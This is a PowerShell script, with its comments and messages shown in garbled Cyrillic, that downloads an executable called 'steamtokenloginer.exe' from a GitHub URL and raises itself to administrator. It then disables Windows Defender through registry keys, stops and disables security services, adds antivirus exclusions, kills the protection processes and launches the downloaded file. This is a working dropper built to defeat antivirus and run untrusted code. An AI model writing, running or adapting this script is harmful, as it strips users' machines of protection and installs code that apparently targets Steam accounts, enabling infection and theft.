# –ù–∞—Å—Ç—Ä–æ–π–∫–∏
$exeUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.exe"
$targetFolder = "C:\Users\zenas\Desktop\–ù–æ–≤–∞—è –ø–∞–ø–∫–∞ (7)"
$exePath = "$targetFolder\steamtokenloginer.exe"

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞..." -ForegroundColor Yellow
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"$($MyInvocation.MyCommand.Definition)`""
    exit
}

Write-Host "‚úÖ –ó–∞–ø—É—â–µ–Ω–æ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞" -ForegroundColor Green

# –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
if (-not (Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder -Force
    Write-Host "üìÅ –°–æ–∑–¥–∞–Ω–∞ –ø–∞–ø–∫–∞: $targetFolder" -ForegroundColor Green
}

Write-Host "üì• –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞..." -ForegroundColor Yellow

try {
    # –°–∫–∞—á–∏–≤–∞–µ–º EXE —Ñ–∞–π–ª
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
    
    $fileSize = (Get-Item $exePath).Length
    Write-Host "‚úÖ –§–∞–π–ª —Å–∫–∞—á–∞–Ω: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Green
    
    # 1. –°–Ω–∞—á–∞–ª–∞ –æ—Ç–∫–ª—é—á–∞–µ–º –∑–∞—â–∏—Ç—É —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä
    Write-Host "üî¥ –û–¢–ö–õ–Æ–ß–ê–ï–ú –ó–ê–©–ò–¢–£ –ß–ï–†–ï–ó –†–ï–ï–°–¢–†..." -ForegroundColor Red
    
    # –û—Ç–∫–ª—é—á–∞–µ–º —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä (–±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω–æ)
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    
    Write-Host "‚úÖ –†–µ–µ—Å—Ç—Ä –∏–∑–º–µ–Ω–µ–Ω" -ForegroundColor Green
    
    # 2. –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏ –æ—Ç–∫–ª—é—á–∞–µ–º —Å–ª—É–∂–±—ã
    Write-Host "üõë –û–°–¢–ê–ù–ê–í–õ–ò–í–ê–ï–ú –°–õ–£–ñ–ë–´ –ó–ê–©–ò–¢–´..." -ForegroundColor Red
    
    $services = @(
        "WinDefend",
        "WdNisSvc",
        "Sense",
        "SecurityHealthService"
    )
    
    foreach ($service in $services) {
        try {
            Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
            Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
            Write-Host "‚úÖ –°–ª—É–∂–±–∞ $service –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –∏ –æ—Ç–∫–ª—é—á–µ–Ω–∞" -ForegroundColor Green
        }
        catch {
            Write-Host "‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å $service" -ForegroundColor Yellow
        }
    }
    
    # 3. –î–æ–±–∞–≤–ª—è–µ–º –≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è (–ø–æ—Å–ª–µ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –∑–∞—â–∏—Ç—ã)
    Write-Host "üõ°Ô∏è –î–æ–±–∞–≤–ª—è–µ–º –≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è..." -ForegroundColor Yellow
    
    try {
        Add-MpPreference -ExclusionPath $exePath -ErrorAction Stop
        Add-MpPreference -ExclusionPath $targetFolder -ErrorAction Stop
        Write-Host "‚úÖ –§–∞–π–ª –∏ –ø–∞–ø–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω—ã –≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è" -ForegroundColor Green
    }
    catch {
        Write-Host "‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –¥–æ–±–∞–≤–∏—Ç—å –≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ PowerShell" -ForegroundColor Yellow
        Write-Host "üîÑ –ü—Ä–æ–±—É–µ–º —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä..." -ForegroundColor Yellow
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∏—Å–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä
        $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
        if (Test-Path $registryPath) {
            New-ItemProperty -Path $registryPath -Name $exePath -PropertyType String -Value "0" -Force -ErrorAction SilentlyContinue
            New-ItemProperty -Path $registryPath -Name $targetFolder -PropertyType String -Value "0" -Force -ErrorAction SilentlyContinue
            Write-Host "‚úÖ –ò—Å–∫–ª—é—á–µ–Ω–∏—è –¥–æ–±–∞–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä" -ForegroundColor Green
        }
    }
    
    # 4. –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ —É–±–∏–≤–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å—ã –∑–∞—â–∏—Ç—ã
    Write-Host "üî™ –ó–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å—ã –∑–∞—â–∏—Ç—ã..." -ForegroundColor Red
    
    $processes = @(
        "MsMpEng.exe",
        "NisSrv.exe",
        "MsSense.exe",
        "SecurityHealthService.exe"
    )
    
    foreach ($process in $processes) {
        try {
            Stop-Process -Name $process -Force -ErrorAction SilentlyContinue
            Write-Host "‚úÖ –ü—Ä–æ—Ü–µ—Å—Å $process –∑–∞–≤–µ—Ä—à–µ–Ω" -ForegroundColor Green
        }
        catch {
            # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –µ—Å–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å –Ω–µ –∑–∞–ø—É—â–µ–Ω
        }
    }
    
    # 5. –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º Explorer —á—Ç–æ–±—ã –ø—Ä–∏–º–µ–Ω–∏—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏—è
    Write-Host "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º Explorer..." -ForegroundColor Yellow
    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    
    # 6. –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≥—Ä–∞–º–º—É
    Write-Host "üöÄ –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ..." -ForegroundColor Green
    Start-Process -FilePath $exePath
    Write-Host "üéØ –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ!" -ForegroundColor Green
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å –∑–∞—â–∏—Ç—ã
    Write-Host "`nüîç –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å –∑–∞—â–∏—Ç—ã..." -ForegroundColor Cyan
    try {
        $defenderStatus = Get-MpComputerStatus
        if ($defenderStatus -and $defenderStatus.AntivirusEnabled) {
            Write-Host "‚ùå –ó–∞—â–∏—Ç–∞ –≤—Å–µ –µ—â–µ –∞–∫—Ç–∏–≤–Ω–∞!" -ForegroundColor Red
        } else {
            Write-Host "‚úÖ –ó–∞—â–∏—Ç–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞!" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "‚úÖ –ó–∞—â–∏—Ç–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞ (–Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å—Ç–∞—Ç—É—Å)" -ForegroundColor Green
    }
    
}
catch {
    Write-Host "‚ùå –û—à–∏–±–∫–∞: $_" -ForegroundColor Red
}

Write-Host "`n–ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–ª–∞–≤–∏—à—É –¥–ª—è –≤—ã—Ö–æ–¥–∞..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
